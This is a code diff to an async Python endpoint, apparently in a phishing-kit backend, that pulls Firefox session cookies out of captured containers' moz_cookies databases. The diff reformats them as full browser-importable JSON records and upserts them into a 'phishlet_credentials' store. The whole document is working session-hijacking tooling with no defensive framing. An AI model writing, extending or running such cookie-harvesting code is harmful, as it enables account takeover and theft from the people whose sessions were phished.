@@ -566,12 +566,27 @@ async def get_credentials(target: str = "", email: str = Depends(get_current_use
 
     cookie_script = (
         "import sqlite3\n"
+        "import json\n"
         "db = sqlite3.connect('/tmp/cookies.sqlite')\n"
         "cur = db.cursor()\n"
-        "for host, cookie_name, cookie_value in cur.execute("
-        "'SELECT host, name, value FROM moz_cookies ORDER BY host'"
+        "for row in cur.execute("
+        "'SELECT id, name, value, host, path, expiry, isSecure, isHttpOnly FROM moz_cookies ORDER BY host, name'"
         "):\n"
-        "    print(f'{host}|{cookie_name}|{cookie_value}')\n"
+        "    cookie = {\n"
+        "        'id': row[0],\n"
+        "        'name': row[1],\n"
+        "        'value': row[2],\n"
+        "        'domain': row[3],\n"
+        "        'path': row[4],\n"
+        "        'expirationDate': row[5],\n"
+        "        'hostOnly': not row[3].startswith('.'),\n"
+        "        'secure': bool(row[6]),\n"
+        "        'session': row[5] == 0,\n"
+        "        'httpOnly': bool(row[7]),\n"
+        "        'sameSite': 'unspecified',\n"
+        "        'storeId': '0'\n"
+        "    }\n"
+        "    print(json.dumps(cookie))\n"
     )
 
     output = []
@@ -604,27 +619,65 @@ async def get_credentials(target: str = "", email: str = Depends(get_current_use
         rows = []
         for line in "\n".join(lines).split("\n"):
             line = line.strip()
-            if "|" in line:
-                parts = line.split("|", 2)
-                if len(parts) == 3:
-                    rows.append(tuple(parts))
-        rows.sort(key=lambda row: (row[0], row[1]))
+            if not line:
+                continue
+            try:
+                cookie = json.loads(line)
+                rows.append(cookie)
+            except json.JSONDecodeError:
+                continue
+        rows.sort(key=lambda c: (c.get('domain', ''), c.get('name', '')))
 
-        container_obj = {}
-        for host, cookie_name, cookie_value in rows:
-            container_obj.setdefault(host, {})[cookie_name] = cookie_value
+        container_cookies = []
+        for cookie in rows:
+            host = cookie.get('domain', '')
+            cookie_name = cookie.get('name', '')
+            cookie_value = cookie.get('value', '')
+            cookie_domain = cookie.get('domain', '')
+            cookie_path = cookie.get('path', '/')
+            cookie_expires = cookie.get('expirationDate', 0)
+            cookie_secure = cookie.get('secure', False)
+            cookie_http_only = cookie.get('httpOnly', False)
+            cookie_same_site = cookie.get('sameSite', 'unspecified')
+
+            container_cookies.append({
+                'domain': cookie_domain,
+                'expirationDate': cookie_expires,
+                'hostOnly': cookie.get('hostOnly', False),
+                'httpOnly': cookie_http_only,
+                'name': cookie_name,
+                'path': cookie_path,
+                'sameSite': cookie_same_site,
+                'secure': cookie_secure,
+                'session': cookie.get('session', False),
+                'storeId': cookie.get('storeId', '0'),
+                'value': cookie_value,
+            })
+
+            await db.phishlet_credentials.update_one(
+                {
+                    "container": name,
+                    "host": host,
+                    "name": cookie_name
+                },
+                {
+                    "$set": {
+                        "value": cookie_value,
+                        "domain": cookie_domain,
+                        "path": cookie_path,
+                        "expires": cookie_expires,
+                        "secure": cookie_secure,
+                        "httpOnly": cookie_http_only,
+                        "sameSite": cookie_same_site,
+                        "updated_at": datetime.now(timezone.utc)
+                    }
+                },
+                upsert=True,
+            )
 
         if target:
-            return {"status": "success", "message": f"{name}\n{json.dumps(container_obj, indent=2)}"}
-        output.append(f"{name}\n{json.dumps(container_obj, indent=2)}")
-
-        for host, cookies in container_obj.items():
-            for cookie_name, cookie_value in cookies.items():
-                await db.phishlet_credentials.update_one(
-                    {"container": name, "host": host, "name": cookie_name},
-                    {"$set": {"value": cookie_value, "updated_at": datetime.now(timezone.utc)}},
-                    upsert=True,
-                )
+            return {"status": "success", "message": f"{name}\n{json.dumps(container_cookies, indent=2)}"}
+        output.append(f"{name}\n{json.dumps(container_cookies, indent=2)}")
 
     return {"status": "success", "message": "\n\n".join(output)}
 
